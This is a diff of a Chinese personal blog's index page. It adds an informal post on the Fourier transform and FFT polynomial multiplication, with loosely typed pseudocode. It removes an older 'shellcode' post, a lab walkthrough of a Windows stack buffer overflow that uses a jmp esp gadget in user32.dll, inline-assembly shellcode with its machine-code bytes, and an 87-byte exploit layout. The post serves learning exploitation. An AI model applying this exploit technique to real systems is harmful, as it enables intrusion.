@@ -167,6 +167,180 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/19/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
+      <meta itemprop="name" content="dustball">
+      <meta itemprop="description" content="dustland">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dustland">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/12/19/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/" class="post-title-link" itemprop="url">傅里叶变换</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-12-19 21:52:00" itemprop="dateCreated datePublished" datetime="2022-12-19T21:52:00+08:00">2022-12-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-09-22 01:59:33" itemprop="dateModified" datetime="2024-09-22T01:59:33+08:00">2024-09-22</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="傅里叶变换"><a href="#傅里叶变换" class="headerlink" title="傅里叶变换"></a>傅里叶变换</h1><p>一个欠了一年的帐,今天终于还上了</p>
+<p><del>我根本不知道录音的基本原理</del></p>
+<h2 id="O-n-lg-n-内求解多项式乘法"><a href="#O-n-lg-n-内求解多项式乘法" class="headerlink" title="$O(n\lg n)$内求解多项式乘法"></a>$O(n\lg n)$内求解多项式乘法</h2><p>算法导论上的傅里叶变换,是为了在$O(n\lg n)$时间内,解决多项式乘法</p>
+<p>如果直接让两个多项式卷积,那么朴素方法复杂度显然是$O(n^2)$</p>
+<p>如何降复杂度呢?使用点值计算</p>
+<p>线性代数上可以证明,一个n-1次多项式,可以在其图像上使用n个点唯一确定(插值方法)</p>
+<p>也就是说,一个多项式$A(x)&#x3D;\sum_{j&#x3D;0}^{n-1}a_jx^j$可以用n个点表示</p>
+<p>那么两个均为$n-1$次的多项式$A(x),B(x)$,其乘积多项式就得是一个$2n-2$次多项式,需要$2n-2$个点唯一确定</p>
+<p>显然从一个$n-1$次多项式上取n-1个点已经足够唯一确定这个多项式了,再取其他点就是冗余信息,对确定表达式没有影响,因此可以在$A(x),B(x)$上各取2n-2个点,计算这2n-2个点的积,这就得出了积多项式的点值表示</p>
+<p>其中第i个点$C(x_i,A(x_i)\times B(x_i))$纵坐标为两个多项式在$x_0$处函数值的乘积</p>
+<p>画在图上也就是:</p>
+<p>普通乘法是我们之前使用的lowB方法,下面曲线救国nb,就求值和插值这两步是真nb,求值和插值为何是$O(n\lg n)$呢?</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219191232000.png" alt="image-20221219191232000"></p>
+<p>使用之前学过的方法,这两步都是$O(n^2)$的,</p>
+<p>求值时需要将$x_0,x_1…$以此带入$A(x)$一共n个自变量,每个自变量求值都是$O(n)$,因此总共$O(n^2)$</p>
+<p>插值时需要使用拉格朗日插值法,也是$O(n^2)$</p>
+<blockquote>
+<p>拉格朗日插值公式:<br>$$<br>A(x)&#x3D;\sum_{k&#x3D;0}^{n-1}y_k\frac{\Pi_{j\neq k }(x-x_j)}{\Pi_{j\neq k}(x_k-x_j)}<br>$$<br>其中$(x_0,y_0),(x_1,y_1),…,(x_n-1,y_n-1)$是多项式$A(x)$的点值表示</p>
+<p>最外层这个求和已经是$O(n)$</p>
+<p>用二维数组$M[k][j]&#x3D;x_k-x_j$预处理分母,</p>
+<p>分子预先先直接求出$F(x)&#x3D;\Pi(x-x_j)$</p>
+<p>那么对于一个给定的k,分母就是n个数的积,$O(n)$</p>
+<p>分子就是$F(x)&#x2F;(x-x_j)$,$O(n)$</p>
+<p>乘上最外圈的$O(n)$得到$O(n^2)$</p>
+<p>也就是说,之前使用的方法是$O(n^2)$的</p>
+</blockquote>
+<p>但是使用快速傅里叶变换这种吊法,就能给他降到$O(n\lg n)$</p>
+<p>怎么降的?选点值的时候有讲究</p>
+<p>任意n个不同的点就可以确定一个n-1次表达式.</p>
+<p>如果选n个单位复根,然后对系数向量$(a_0,a_1,…,a_{n-1})$应用离散傅里叶变换DFT,就可以在$O(n\lg n)$内完成求值,使用逆DFT变换就可以在$O(n\lg n)$完成插值</p>
+<h2 id="单位复根儿"><a href="#单位复根儿" class="headerlink" title="单位复根儿"></a>单位复根儿</h2><p>“n次单位复根”就是指满足$\omega^n&#x3D;1$的负数$\omega$,注意是这个$\omega$,不带那个n次方,一定要注意上下角标</p>
+<p>欧拉公式<br>$$<br>e^{i\pi}+1&#x3D;0<br>$$<br>第k个n次单位复根是$\omega_k&#x3D;e^{\frac{2\pi ik}{n}}$</p>
+<p>显然$\omega_k^n&#x3D;(e^{\frac{2\pi ik}{n}})^n&#x3D;e^{2\pi ik}&#x3D;((e^{i\pi})^2)^k&#x3D;((-1)^2)^k&#x3D;1^k&#x3D;1$</p>
+<p>n次单位复根儿恰好有n个,也就是$k&#x3D;0,1,2,…,n-1$</p>
+<p>这n个画在复平面儿上是很整齐的,比如8次复根就长这样:</p>
+<p>任何两个相邻的单位复根之间的角度都是固定的,$360&#x2F;n&#x3D;360&#x2F;8$</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219193558548.png" alt="image-20221219193558548"></p>
+<p>都落在复平面单位元上</p>
+<p>显然8次复根只有8个,如果非要写第九个$\omega_8^9$,就和$\omega_8^0$重合了,</p>
+<p>然后书上就说这是加法群$(Z_8,+)$,确实是,除了装了个B对于解决问题没有帮助,甚至没有学过抽代的就蒙蔽了</p>
+<h2 id="DFT"><a href="#DFT" class="headerlink" title="DFT"></a>DFT</h2><p>求n-1次多项式的点值表示时,就需要选取n个点$(x_0,x_1,x,…,x_{n-1})$,然后求出各自的函数值$(y_0,y_1,…,y_{n-1})$</p>
+<p>如果选取的n个点是n个富哥儿,那么此时有<br>$$<br>y_k&#x3D;A(\omega_n^k)&#x3D;\sum_{j&#x3D;0}^{n-1}a_j\omega <em>n^{jk}<br>$$<br>以此得到的$\vec{y}&#x3D;(y_0,y_1,…,y</em>{n-1})$叫做系数向量$\vec{a}&#x3D;(a_0,a_1,…,a_{n-1})$的离散傅里叶变换,</p>
+<p>记作$\vec{y}&#x3D;DFT_n(\vec{a})$</p>
+<p>笑死,这看上去不就是带入求值吗,选n个富哥有屁用啊?</p>
+<p>如果用普通的带入求值,找n个富哥儿和找n个普通人儿没有区别.</p>
+<p>富哥儿的作用不能浪费喽,他们和普通值又有啥区别呢?</p>
+<p>这就是单位复根儿的几个性质</p>
+<p>这几个性质在计算时会体现群论的对称性,这意味着,这n个富哥确实能够比n个普通值携带更多的信息</p>
+<blockquote>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219195023551.png" alt="image-20221219195023551"></p>
+</blockquote>
+<h2 id="FFT"><a href="#FFT" class="headerlink" title="FFT"></a>FFT</h2><p>fast Fourier transform,快速傅里叶变换</p>
+<p>在$O(n\lg n)$内求解DFT的算法</p>
+<p>也就是说,DFT并不是一个求解方法,只是娶了n个富哥作为点值表示</p>
+<p>仍然可以使用带入求值这种$O(n^2)$的lowB算法求解</p>
+<p>而FFT就是一种吊法</p>
+<p>他这样变形:</p>
+<p>首先n向上取整到最近的2的幂次,这样做是为了保证能够一直二分直到剩1项,反正多取点不会降低精度</p>
+<p>后面的n默认就认为是2的幂次了<br>$$<br>\begin{aligned}<br>A(x)&amp;&#x3D;a_0+a_1x+a_2x^2+…+a_{n-1}x^{n-1}\<br>&amp;&#x3D;(a_0+a_2x^2+a_4x^4+…+a_{n-2}x^{n-2})+(a_1x+a_3x^3+a_5x^{5}+…+a_{n-1}x^{n-1})\<br>&amp;&#x3D;A^{[0]}(x^2)+xA^{[1]}(x^2)<br>\end{aligned}<br>$$<br>也就是说将$A(x)$按照偶数项和奇数项分开,其中奇数项都提出一个x来,这样子多项式中的x都是偶数,可以提取$x^2$作为自变量,于是得到<br>$$<br>\begin{cases}<br>A^{[0]}(x)&#x3D;a_0+a_2x+a_4x^2+…+a_{n-2}x^{\frac{n}{2}-1}\<br>A^{[1]}(x)&#x3D;a_1+a_3x+a_5x^2+…+a_{n-1}x^{\frac{n}{2}-1}<br>\end{cases}<br>$$<br>时刻不要忘记在求什么,</p>
+<p>我们现在已知的是$\vec{a}&#x3D;(a_0,a_1,a_2,…,a_{n-1})$,$\vec{x}&#x3D;(\omega_n^0,\omega_n^1,…,\omega_n^{n-1})$</p>
+<p>要求的是$\vec {y}&#x3D;DFT_n(\vec{a})$</p>
+<p>现在可以这样算了:<br>$$<br>A(x_k)&#x3D;A(\omega_{n}^k)&#x3D;A^{[0]}(\omega^{2k}_n)+\omega^k_nA^{[1]}(\omega^{2k}_n)<br>$$<br>注意到我们不容易计算$A(x)$是因为,它的项太多了,0次项,1次项等等一直到n-1次项,共n项</p>
+<p>而现在对于一个$A^{[0]}(x)$他只有$\frac{n}{2}$项了,工作量直接下降到一半</p>
+<p>以此递归,总会有个时候,$A(x)$只有一项,也就是0次项,也就是那个常数项,算也不用算直接返回了,和x没有关系了,和富哥没关系了</p>
+<p>写出伪代码:</p>
+<p>注意FFT函数的输入是目标多项式的系数向量,不是富哥,因为富哥是作为常数使用的,不需要参数传递</p>
+<p>FFT函数输出的是$\vec{y}&#x3D;DFT(\vec{a})$也就是和将n个富哥直接带入多项式求值得到的n个值相同,但是算法更好</p>
+<blockquote>
+<p>一定注意函数不是y&#x3D;A(x),而是y&#x3D;FFT(a)</p>
+<p>一定要清楚函数在干什么</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">FFT</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a)</span></span>&#123;<span class="comment">//a是系数,返回y向量</span></span><br><span class="line">	n=a.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>==n)&#123;<span class="comment">//递归出口条件,只剩一项时,也就是那个常数项,直接返回此时的a,实际上是a[0]作为y[0]返回了y</span></span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;;</span><br><span class="line">    Complex omega_n=e^(<span class="number">2</span>*pi*i/n);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; a0,a1;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)a<span class="number">0.</span><span class="built_in">push_back</span>(a[i]);</span><br><span class="line">        <span class="keyword">else</span> a<span class="number">1.</span><span class="built_in">push_back</span>(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> y0=<span class="built_in">FFT</span>(a0);</span><br><span class="line">    <span class="type">int</span> y1=<span class="built_in">FFT</span>(a1);</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">y</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)&#123;<span class="comment">//一定注意此处上界是n/2</span></span><br><span class="line">        y[i]	=y0[i]+<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//容易理解</span></span><br><span class="line">       	y[n/<span class="number">2</span>+i]=y0[i]-<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//想对困难</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里面有一个<code>y[n/2+i]=y0[i]-pow(omega_n,i)*y1[i]</code>,怎么得到的呢?<br>$$<br>\begin{aligned}<br>y[\frac{n}{2}+i]&amp;&#x3D;A(\omega_n^{\frac{n}{2}+i})\<br>&amp;&#x3D;A^{[0]}(\omega_n^{n+2i})+\omega_n^{\frac{n}{2}+i}A^{[1]}(\omega_n^{n+2i})\<br>&amp;&#x3D;A^{[0]}(\omega_n^{2i})+\omega_n^{\frac{n}{2}+i}A^{[1]}(\omega_n^{2i})\<br>&amp;&#x3D;A^{[0]}(\omega_{\frac{n}{2}}^i)-\omega_n^{i}A^{[1]}(\omega_{\frac{n}{2}}^i)\<br>&amp;&#x3D;y_0[i]-\omega_{n}^i y_1[i]<br>\end{aligned}<br>$$<br><strong>这就体现出富哥和普通点的区别了</strong>,富哥的变换很灵活</p>
+<p>从上面的伪代码可以看出,最底层的递归和自变量无关.</p>
+<p>加速发生在这里,将工程量直接缩减到一半</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)&#123;<span class="comment">//一定注意此处上界是n/2</span></span><br><span class="line">    y[i]	=y0[i]+<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//容易理解</span></span><br><span class="line">   	y[n/<span class="number">2</span>+i]=y0[i]-<span class="built_in">pow</span>(omega_n,i)*y1[i];<span class="comment">//想对困难</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>每次递归都将工程量缩减一半,因此总工程量直接对n取对数<br>$$<br>T(n)&#x3D;2T(\frac{n}{2})+\Theta(n)&#x3D;\Theta(n\lg n)<br>$$</p>
+<p>好了到此FFT的思路有了,求值结束,也就是我们求得了$y&#x3D;DFT(a)$</p>
+<blockquote>
+<p>举个例子,$A(x)&#x3D;1+2x+x^2+x^3$,正好有$2^2&#x3D;4$项,n&#x3D;4</p>
+<p>4次单位复根$\omega_4^k&#x3D;e^{\frac{2\pi ik}{4}}$</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FFT(&lt;1,2,1,1&gt;)&#123;</span><br><span class="line">	n=&lt;1,2,1,1&gt;.length()=4;</span><br><span class="line">	a0=&lt;1,1&gt;;</span><br><span class="line">	a1=&lt;2,1&gt;;</span><br><span class="line">	w1;</span><br><span class="line">	y0=FFT(&lt;1,1&gt;)&#123;</span><br><span class="line">		n=&lt;1,1&gt;.length()=2;</span><br><span class="line">		a0=&lt;1&gt;;</span><br><span class="line">		a1=&lt;1&gt;;</span><br><span class="line">		y0=FFT(&lt;1&gt;)=&lt;1&gt;;</span><br><span class="line">		y1=FFT(&lt;1&gt;)=&lt;1&gt;;</span><br><span class="line">		y[0]=y[0]+w1</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
+<p>下面考虑如何从点值形式倒回去,也就是如何在$O(n\lg n)$实现插值</p>
+<p>现在已知的是$\vec{y}$和$\vec{x}&#x3D;{\omega_{n}^0,\omega_n^1,…,\omega_n^{n-1}}$,求系数向量$\vec{a}$</p>
+<p>显然可以待定系数法设n个系数,然后带入自变量和因变量,解一元n次方程组.</p>
+<p>高斯消元法是$O(n^2)$的lowB算法,要用吊算法</p>
+<p>写成矩阵形式</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221219211357315.png" alt="image-20221219211357315"></p>
+<p>也就是说,一眼顶针,鉴定为范德蒙矩阵,必然可逆且逆矩阵唯一</p>
+<p>现在要用尽可能快的方法求解这个范德蒙矩阵$V$的逆矩阵,这个求解方法就是算法关键</p>
+<p>这有个定理$V^{-1}_n[j,k]&#x3D;\frac{\omega_n^{-kj}}{n}$</p>
+<p>怎么得出来的,我线性代数忘了,不会解,但是$VV^{-1}$算一下确实得到$E$,满足互逆矩阵的定义</p>
+<p>由于$\vec{a}&#x3D;\vec V^{-1}\vec{y}$</p>
+<p>$a_j$就等于$\vec V^{-1}$的第j行与$\vec y$的乘积,也就是说<br>$$<br>a_j&#x3D;\sum_{k&#x3D;0}^{n-1}V_n^{-1}[j,k]\times y_k\<br>&#x3D;\sum_{k&#x3D;0}^{n-1}\frac{\omega^{-kj}<em>n}{n}\times y_k\<br>&#x3D;\frac{1}{n}\sum</em>{k&#x3D;0}^{n-1}\omega_n^{-kj}\times y_k<br>$$<br>求解一个$a_j$,是$O(n)$复杂度的,</p>
+<p>共有n个$a_j$,总共就是$O(n^2)$复杂度的,怎么降到$O(n\lg n)$呢?</p>
+<p>回忆正向的FFT是干啥的来着</p>
+<p>是求解$\vec{y}&#x3D;DFT_n(\vec {a})$问题的</p>
+<p>其中$y_j&#x3D;\sum_{k&#x3D;0}^{n-1}a_j\omega_n^{jk}$</p>
+<p>类比一下<br>$$<br>\begin{aligned}<br>n a_j&amp;&#x3D;\sum_{k&#x3D;0}^{n-1} y_k\omega_n^{-jk}\<br>y_j&amp;&#x3D;\sum_{k&#x3D;0}^{n-1}a_k\omega_n^{jk}<br>\end{aligned}<br>$$<br>令$\vec{y’}&#x3D;n\vec{a},$</p>
+<p>$\vec{a’}&#x3D;\vec{y}$</p>
+<p>令单位富哥变成单位负哥,就可以直接带入FFT函数求解了$\vec{y’}$了</p>
+<p>解出来都除以n就得到了$\vec{a}$</p>
+<p>因此又在$O(n\lg n)$内解决了</p>
+<h2 id="回到多项式求积"><a href="#回到多项式求积" class="headerlink" title="回到多项式求积"></a>回到多项式求积</h2><p>卷积定理:</p>
+<p>对于两个长度为n的向量$\vec a,\vec b$<br>$$<br>a\otimes b&#x3D;DFT^{-1}<em>{2n}(DFT</em>{2n}(a)·DFT_{2n}(b))<br>$$<br>将多项式A,B只保留系数看成向量a,b,此时$a\otimes b$就是积多项式AB的系数向量</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/11/11/moectf%E8%A1%A5%E9%A2%98/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2996,381 +3170,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/17/shellcode/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
-      <meta itemprop="name" content="dustball">
-      <meta itemprop="description" content="dustland">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dustland">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/17/shellcode/" class="post-title-link" itemprop="url">shellcode</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-09-17 23:55:00" itemprop="dateCreated datePublished" datetime="2022-09-17T23:55:00+08:00">2022-09-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-09-18 20:34:25" itemprop="dateModified" datetime="2022-09-18T20:34:25+08:00">2022-09-18</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h2><p>在第二章的实验中,跳转执行堆栈中的shellcode时,使用的是绝对地址,只要是换个系统,可能就不是这个地址了.user32在不同的平台上,映像基址也不同,MessageBoxA函数的地址也不同.</p>
-<p>也就是说第二章的代码只适用于很小范围的操作系统环境.现在要开发老少通吃的shellcode代码.</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917091036012.png" alt="由于动态链接库的装载,函数栈帧可能每次运行都不同"></p>
-<p>但是有一点可以确定的是,esp栈顶指针总会在一个函数retn之前退回到函数一开始时的状态</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:00401090;开端</span><br><span class="line">.text:00401090                 push    ebp;这个push和最后的pop也是相对应的</span><br><span class="line">.text:00401091                 mov     ebp, esp</span><br><span class="line">.text:00401093                 sub     esp, 448h;扩大448个字节</span><br><span class="line">....;正文部分</span><br><span class="line">;尾声</span><br><span class="line">.text:00401152                 add     esp, 448h;退栈448h个字节</span><br><span class="line">.text:00401158                 cmp     ebp, esp</span><br><span class="line">.text:0040115A                 call    __chkesp</span><br><span class="line">.text:0040115F                 mov     esp, ebp</span><br><span class="line">.text:00401161                 pop     ebp</span><br><span class="line">.text:00401162                 retn</span><br><span class="line">.text:00401162 _main_0         endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
-
-<p>retn之后,esp退回到调用之前的状态,即调用者已经将参数压栈准备好的状态,接下来调用者就得清理参数了</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917092022180.png" alt="image-20220917092022180"></p>
-<p>根据这一点,可以将shellcode溢出到被调用者栈帧,调用者ebp,返回地址,参数,调用者栈帧</p>
-<p>其中返回地址之后的(被调用者栈帧,调用者ebp)随便填充</p>
-<p>返回地址可以找一条<code>jmp esp</code>的地址放上</p>
-<p>shellcode写到返回地址之前的参数,甚至调用者栈帧里</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917092903771.png" alt="image-20220917092903771"></p>
-<p>之后eip顺势执行返回地址之前的shellcode</p>
-<p>现在的问题是,从哪里找jmp esp,显然要从一个万年不变的地方,相对来说,user32.dll,kernel32.dll这种动态库就是个好地方</p>
-<p>正常情况下,系统的dll的代码段是找不到jmp esp这种脑残一样的指令的,既要堆栈不可执行,又要控制跳转到堆栈,属于是既要当婊子,又要立牌坊了.</p>
-<p>但是jmp esp本质上就是0xFFE4这么一个机器码,从海量的dll库中,随便挑一个地方查0xFFE4这么一串数字,不是没有存在的可能</p>
-<p>用ida打开user32.dll,Ctrl+B查找字节序列0xFFE4,能找到很多这种序列,比如</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917103921056.png" alt="一定要注意字节序"></p>
-<p>一定要注意字节序,一定要注意字节序,一定要注意字节序,一定要注意字节序,一定要注意字节序</p>
-<p>为了让程序弹窗之后能够正常退出,需要调用exit(0)函数,这个函数在kernel32.dll中,可以用dependency walker查其位置</p>
-<p>Kernel32.dll映像基址0x77E40000,</p>
-<p>ExitProcess函数的RVA&#x3D;0x00015CB5</p>
-<p>则VA(ExitProcess)&#x3D;RVA(ExitProcess)+ImageBase(Kernel32.dll)&#x3D;0x77E55CB5</p>
-<p>为了将shellcode从汇编指令转化为机器码,可以使用内联汇编<code>_asm&#123;&#125;</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	<span class="type">char</span> dllbuf[<span class="number">11</span>] = <span class="string">&quot;user32.dll&quot;</span>;</span><br><span class="line">	LibHandle = LoadLibrary(dllbuf);</span><br><span class="line">	_asm &#123; </span><br><span class="line"> 		sub sp,<span class="number">0x440</span></span><br><span class="line"> 		xor ebx,ebx</span><br><span class="line"> 		push ebx <span class="comment">// cut string</span></span><br><span class="line"> 		push <span class="number">0x74736577</span></span><br><span class="line"> 		push <span class="number">0x6C696166</span> <span class="comment">// push failwest</span></span><br><span class="line"> 		mov eax,esp <span class="comment">// load address of failwest</span></span><br><span class="line"> 		push ebx</span><br><span class="line"> 		push eax</span><br><span class="line"> 		push eax</span><br><span class="line"> 		push ebx</span><br><span class="line"> 		mov eax,<span class="number">0x77D3ADD7</span> <span class="comment">// address should be reset in different OS</span></span><br><span class="line"> 		call eax <span class="comment">// call MessageboxA</span></span><br><span class="line">  		push ebx</span><br><span class="line"> 		mov eax,<span class="number">0x77E55CB5</span></span><br><span class="line"> 		call eax <span class="comment">// call exit(0)</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译链接之后用010editor打开,在.text节找到内联的汇编代码</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917101452302.png" alt="image-20220917101452302"></p>
-<p>对应的机器码为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">66 81 EC 40 04 33 DB 53 68 77 65 73 74 68 66 61</span><br><span class="line">69 6C 8B C4 53 50 50 53 B8 D7 AD D3 77 FF D0</span><br></pre></td></tr></table></figure>
-
-<p>这是31个字节</p>
-<p>从buffer到返回地址家门口一共是52个字节,随便用52个’A’填充即可</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917003031600.png" alt="image-20220917003031600"></p>
-<p>然后返回地址用0x77D4754A覆盖</p>
-<p>然后加上31个字节的shellcode,就得到了完整的exploit,共52+4+31&#x3D;87字节</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104046117.png" alt="image-20220917104046117"></p>
-<p>放到windows虚拟机上跑一下</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104142074.png" alt="pwn!"></p>
-<p>通了</p>
-<p>但是点击确定之后还是会报错</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104550420.png" alt="image-20220917104550420"></p>
-<p>eip&#x3D;0x12FB49的时候发生的错误,错误代码0x80000003,意思是遭遇到中断了</p>
-<p>下面调试一下看看发生了什么</p>
-<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><h4 id="strcmp拷贝password到buffer之后"><a href="#strcmp拷贝password到buffer之后" class="headerlink" title="strcmp拷贝password到buffer之后"></a>strcmp拷贝password到buffer之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105035975.png" alt="image-20220917105035975"></p>
-<h4 id="retn之后"><a href="#retn之后" class="headerlink" title="retn之后"></a>retn之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105128605.png" alt="image-20220917105128605"></p>
-<p>控制已经转移到user32.dll中,0x77D4754A位置,将要执行jmp esp,而此时esp&#x3D;0x12FB28</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105257574.png" alt="0x12FB28"></p>
-<p>此处正是溢出放置的shellcode</p>
